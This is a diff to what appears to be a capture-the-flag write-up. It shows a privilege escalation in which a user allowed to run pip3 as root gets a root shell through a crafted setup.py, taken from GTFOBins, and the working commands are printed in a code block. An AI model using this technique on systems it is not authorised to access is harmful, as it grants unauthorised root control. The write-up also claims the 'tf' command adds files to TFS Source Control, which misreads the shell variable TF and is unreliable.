@@ -235,7 +235,7 @@ now lets run the exploit and login via ssh
 by checking user's privileges ,`low `can run command from `/usr/bin/pip3` 
 so we can get pip shell or  revese shell to get root access.
 first i tried to make pip shell and it was success.
-got it from here  [pip shell](https://gtfobins.github.io/gtfobins/pip/).
+got it from here  [FakePip](https://gtfobins.github.io/gtfobins/pip/).
 ```
 TF=$(mktemp -d)
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
@@ -243,7 +243,5 @@ pip install $TF
 ``` 
 by tf Command we can  add news folder and file from file system to TFS Source Control. Need to do check-in before these file can be visible.
 i created temporary file and run the exploit 
-```echo "import os; os.execl('/bin/sh', 'sh','-c', 'sh <$(tty) >$(tty) 2>$(tty)')" >$TF/setup.py```
-
 ![Screenshot from 2020-08-24 07-38-46](https://user-images.githubusercontent.com/36403473/100485156-b835d580-3107-11eb-9599-04742cd2bf83.png)
 finally pwned 
